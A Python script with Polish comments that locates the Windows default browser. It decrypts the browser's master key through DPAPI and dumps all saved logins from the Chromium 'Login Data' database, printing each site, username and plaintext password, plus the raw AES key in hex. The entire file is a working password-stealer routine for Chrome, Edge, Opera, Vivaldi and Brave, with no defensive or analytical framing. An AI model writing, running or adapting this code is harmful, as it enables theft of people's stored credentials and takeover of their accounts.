import os
import json
import base64
import winreg
import shutil
import sqlite3
import binascii
from pathlib import Path
import win32crypt  # Wymaga instalacji: pip install pywin32
import win32process
import win32con
import win32api
from Crypto.Cipher import AES  # Wymaga instalacji: pip install pycryptodome

# 1. Pobranie ścieżki do katalogu domowego użytkownika
home_dir = Path.home()
temp_dir = home_dir / "AppData" / "Local" / "Temp"

# 2. Mapowanie procesów przeglądarek (potrzebne do sprawdzania statusu działania)
browser_processes = {
    "chrome": "chrome.exe",
    "google chrome": "chrome.exe",
    "msedge": "msedge.exe",
    "microsoft edge": "msedge.exe",
    "opera stable": "opera.exe",
    "opera gx": "opera.exe",
    "vivaldi": "vivaldi.exe",
    "brave": "brave.exe",
    "chromium": "chrome.exe"
}

# 3. Słownik ze ścieżkami do plików "Local State"
local_state_paths = {
    "chrome": home_dir / "AppData/Local/Google/Chrome/User Data/Local State",
    "google chrome": home_dir / "AppData/Local/Google/Chrome/User Data/Local State",
    "msedge": home_dir / "AppData/Local/Microsoft/Edge/User Data/Local State",
    "microsoft edge": home_dir / "AppData/Local/Microsoft/Edge/User Data/Local State",
    "opera stable": home_dir / "AppData/Roaming/Opera Software/Opera Stable/Local State",
    "opera gx": home_dir / "AppData/Roaming/Opera Software/Opera GX Stable/Local State",
    "vivaldi": home_dir / "AppData/Local/Vivaldi/User Data/Local State",
    "brave": home_dir / "AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State",
    "chromium": home_dir / "AppData/Local/Chromium/User Data/Local State"
}

# 4. Słownik ze ścieżkami do baz danych "Login Data"
login_data_paths = {
    "chrome": home_dir / "AppData/Local/Google/Chrome/User Data/Default/Login Data",
    "google chrome": home_dir / "AppData/Local/Google/Chrome/User Data/Default/Login Data",
    "msedge": home_dir / "AppData/Local/Microsoft/Edge/User Data/Default/Login Data",
    "microsoft edge": home_dir / "AppData/Local/Microsoft/Edge/User Data/Default/Login Data",
    "opera stable": home_dir / "AppData/Roaming/Opera Software/Opera Stable/Login Data",
    "opera gx": home_dir / "AppData/Roaming/Opera Software/Opera GX Stable/Login Data",
    "vivaldi": home_dir / "AppData/Local/Vivaldi/User Data/Default/Login Data",
    "brave": home_dir / "AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data",
    "chromium": home_dir / "AppData/Local/Chromium/User Data/Default/Login Data"
}

def get_browser_name():
    """Identyfikuje domyślną przeglądarkę systemową na podstawie rejestru Windows."""
    default_browser_key = r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, default_browser_key) as key:
            prog_id, _ = winreg.QueryValueEx(key, "ProgId")
        
        try: 
            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, rf"{prog_id}\Application") as key:
                return winreg.QueryValueEx(key, "ApplicationName")[0]
        except (FileNotFoundError, IndexError):
            pass

        try:
            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, rf"{prog_id}\shell\open\command") as key:
                command, _ = winreg.QueryValueEx(key, "")
                exe_path = command.split('"')[1] if '"' in command else command.split()[0]
                browser_name = os.path.basename(exe_path).replace(".exe", "")
                return browser_name
        except Exception:
            return prog_id
            
    except Exception:
        return None

def check_browser_status(process_name):
    """Sprawdza, czy proces danej przeglądarki jest aktualnie uruchomiony w systemie."""
    try:
        pids = win32process.EnumProcesses()
        for pid in pids:
            if pid == 0:
                continue
            try:
                handle = win32api.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
                name = win32process.GetModuleFileNameEx(handle, 0)
                win32api.CloseHandle(handle)
                if process_name.lower() in name.lower():
                    return True
            except Exception:
                continue
        return False
    except Exception:
        return False

def extract_clean_aes_key(local_state_path):
    """Odczytuje plik Local State i deszyfruje klucz główny przy użyciu Windows DPAPI."""
    if not os.path.exists(local_state_path):
        print(f"[-] Błąd: Nie znaleziono pliku Local State w lokalizacji:\n    {local_state_path}")
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state_data = json.loads(f.read())
        
        encrypted_key_b64 = local_state_data["os_crypt"]["encrypted_key"]
        encrypted_key_bytes = base64.b64decode(encrypted_key_b64)
        just_encrypted_data = encrypted_key_bytes[5:]
        
        # POPRAWKA: Prawidłowe wyciągnięcie binarnego klucza z krotki [1]
        clean_key_bytes = win32crypt.CryptUnprotectData(just_encrypted_data, None, None, None, 0)[1]
        return clean_key_bytes
        
    except KeyError:
        print("[-] Błąd: Plik Local State nie zawiera struktury 'os_crypt/encrypted_key'.")
        return None
    except Exception as e:
        print(f"[-] Błąd podczas deszyfrowania przez Windows DPAPI: {e}")
        return None

def decrypt_password(encrypted_password, key):
    """Odszyfrowuje pojedyncze hasło za pomocą algorytmu AES-GCM (wersje v10/v11)."""
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            iv = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
        elif encrypted_password.startswith(b'v20'):
            return "[Zabezpieczenie v20 App-Bound - Wymaga natywnej automatyzacji]"
        else:
            return "[Nieznany format szyfrowania]"
    except Exception as e:
        return f"[Błąd dekryptażu: {e}]"

# --- GŁÓWNA LOGIKA PROGRAMU ---
if __name__ == "__main__":
    print("[*] Identyfikacja domyślnej przeglądarki systemowej...")
    nazwa_przegladarki = get_browser_name()

    if nazwa_przegladarki:
        print(f"[+] Zidentyfikowano przeglądarkę: {nazwa_przegladarki}")
        szukany_klucz = nazwa_przegladarki.lower().strip()
        
        # Pobieranie powiązanej nazwy procesu .exe
        process_exe = browser_processes.get(szukany_klucz, "chrome.exe")
        is_running = check_browser_status(process_exe)
        
        if is_running:
            print(f"[!] OSTRZEŻENIE: Proces '{process_exe}' jest uruchomiony.")
            print("[*] Program automatycznie skopiuje pliki bazy do folderu Temp, aby uniknąć blokady.")
        else:
            print(f"[+] Proces '{process_exe}' jest zamknięty. Bezpieczny bezpośredni dostęp.")

        # Pobranie ścieżek
        sciezka_local_state = local_state_paths.get(szukany_klucz, local_state_paths["chrome"])
        sciezka_login_data = login_data_paths.get(szukany_klucz, login_data_paths["chrome"])
        
        print(f"[*] Pobieranie klucza z: {sciezka_local_state}")
        czysty_klucz_bity = extract_clean_aes_key(sciezka_local_state)
        
        if czysty_klucz_bity:
            print(f"[+] Czysty klucz AES (HEX): {czysty_klucz_bity.hex()}")
            
            if os.path.exists(sciezka_login_data):
                # Zawsze pracujemy na kopii w Temp dla maksymalnej stabilności
                tymczasowa_baza = temp_dir / "Login_Data_Zintegrowana"
                try:
                    shutil.copyfile(sciezka_login_data, tymczasowa_baza)
                    
                    # Odczyt bazy SQLite
                    conn = sqlite3.connect(tymczasowa_baza)
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    
                    print("\n" + "="*80)
                    print(f"{'STRONA WWW':<40} | {'UŻYTKOWNIK':<20} | {'HASŁO':<20}")
                    print("="*80)
                    
                    for row in cursor.fetchall():
                        url = row[0] if row[0] else "Brak URL"
                        username = row[1] if row[1] else "Brak loginu"
                        encrypted_password = row[2]
                        
                        if encrypted_password:
                            haslo_jawne = decrypt_password(encrypted_password, czysty_klucz_bity)
                            url_skrocony = url[:38] + "..." if len(url) > 40 else url
                            print(f"{url_skrocony:<40} | {username:<20} | {haslo_jawne:<20}")
                            
                    print("="*80)
                    conn.close()
                    os.remove(tymczasowa_baza)
                    
                except Exception as e:
                    print(f"[-] Błąd podczas operowania na pliku bazy danych: {e}")
            else:
                print(f"[-] Nie znaleziono pliku bazy danych haseł pod ścieżką: {sciezka_login_data}")
    else:
        print("[-] Nie udało się zidentyfikować domyślnej przeglądarki w rejestrze systemu Windows.")
